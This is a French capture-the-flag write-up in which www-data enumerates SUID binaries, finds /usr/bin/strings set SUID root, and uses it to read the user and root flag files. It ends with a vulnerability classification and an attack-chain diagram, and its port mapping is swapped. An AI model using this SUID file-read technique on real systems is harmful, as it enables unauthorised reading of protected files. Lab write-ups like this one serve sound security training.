Suite du mefferts 1 : 

# 11. Énumération des privilèges

Après l'obtention de la RCE avec les privilèges de `www-data`, une énumération locale est effectuée afin d'identifier d'éventuels vecteurs d'élévation de privilèges.

La recherche des fichiers SUID est réalisée avec :

```bash
find / -perm -4000 -type f 2>/dev/null
```

Parmi les résultats, un binaire particulièrement intéressant est découvert :

```text
/usr/bin/strings
```

Le binaire possède le bit **SUID** et est donc exécuté avec les privilèges de son propriétaire, ici `root`.

On peut vérifier ses permissions avec :

```bash
ls -l /usr/bin/strings
```

Le résultat indique la présence du bit SUID :

```text
-rwsr-xr-x ... root ... /usr/bin/strings
```

Le `s` présent à la place du `x` dans les permissions du propriétaire indique que le bit SUID est actif.

---

# 12. Exploitation du SUID `strings`

`strings` est normalement utilisé pour extraire les chaînes de caractères lisibles présentes dans un fichier.

Le problème vient du fait que le programme est configuré avec le bit SUID root.

Ainsi, lorsqu'il est lancé par `www-data`, son **effective UID (EUID)** est `root`.

Cela permet d'utiliser `strings` pour lire des fichiers auxquels `www-data` n'a normalement pas accès.

## Lecture de `user.txt`

Le premier fichier intéressant est :

```text
/home/uwe/user.txt
```

Une tentative de lecture directe avec `www-data` est limitée par les permissions du système de fichiers.

En revanche, le binaire SUID peut accéder au fichier avec ses privilèges effectifs :

```bash
/usr/bin/strings /home/uwe/user.txt
```

Le contenu obtenu est :

```text
EPI{********}
```

Le flag utilisateur est donc :

```text
EPI{********}
```

---

# 13. Lecture de `root.txt`

Le même principe permet ensuite de lire directement le flag root.

Le fichier ciblé est :

```text
/root/root.txt
```

La commande utilisée est :

```bash
/usr/bin/strings /root/root.txt
```

Le binaire étant SUID root, il dispose des privilèges nécessaires pour lire le fichier.

Le résultat obtenu est :

```text
EPI{********}
```

Le flag root est donc :

```text
EPI{********}
```

> Il n'a donc pas été nécessaire d'obtenir un shell interactif root : la mauvaise configuration du binaire SUID permet directement une **lecture arbitraire de fichiers protégés**.

---

# 14. Analyse de la vulnérabilité

La vulnérabilité principale de cette étape est une mauvaise configuration des privilèges du binaire `strings`.

Le bit SUID fait qu'un utilisateur exécutant le programme bénéficie des privilèges du propriétaire du fichier pendant son exécution.

Dans ce cas :

```text
Utilisateur appelant : www-data
Propriétaire du binaire : root
EUID du processus : root
```

Le problème vient du fait que `strings` accepte comme entrée un chemin de fichier arbitraire et ne limite pas les fichiers pouvant être lus.

On obtient donc la primitive suivante :

```text
www-data
   │
   ▼
/usr/bin/strings (SUID root)
   │
   ▼
EUID = root
   │
   ├── /home/uwe/user.txt
   │
   └── /root/root.txt
```

### Classification

Cette vulnérabilité peut être décrite comme une :

**Improper Privilege Management / Insecure SUID Configuration**

avec comme impact une **arbitrary file read with elevated privileges**.

Le problème n'est pas une vulnérabilité intrinsèque de `strings`, mais sa configuration en SUID root dans ce contexte.

---

# 15. Récapitulatif des deux flags

| Fichier    | Flag                                               | Méthode                                                      |
| ---------- | -------------------------------------------------- | ------------------------------------------------------------ |
| `user.txt` | `EPI{********}`                 | Recon → stéganographie → identifiants → RCE → `strings` SUID |
| `root.txt` | `EPI{********}` | RCE `www-data` → `strings` SUID → lecture directe            |

---

# 16. Chaîne d'exploitation complète

```text
Nmap
  │
  ├── Port 22 → HTTP
  └── Port 80 → SSH
        │
        ▼
    HK Now Store
        │
        ▼
    Analyse du source HTML
        │
        ▼
    Base64
        │
        ▼
    Mot de passe de secours
        │
        ▼
    /recovery.php
        │
        ▼
    Base64 → Base32 → Hex
        │
        ▼
    "les cubes sont la clé de tout"
        │
        ▼
    cube_gold.jpg
        │
        ▼
    steghide
        │
        ▼
    Identifiants Uwe
        │
        ▼
    Authentification / cookie
        │
        ▼
    /my_very_secret_dir/
        │
        ▼
    ?cmd=
        │
        ▼
    RCE
        │
        ▼
    www-data
        │
        ▼
    Recherche des SUID
        │
        ▼
    /usr/bin/strings
        │
        ▼
    SUID root
        │
        ├───────────────┐
        ▼               ▼
 /home/uwe/user.txt  /root/root.txt
        │               │
        ▼               ▼
     user flag       root flag
```

# 17. Flags

### User

```text
EPI{********}
```

### Root

```text
EPI{********}
```
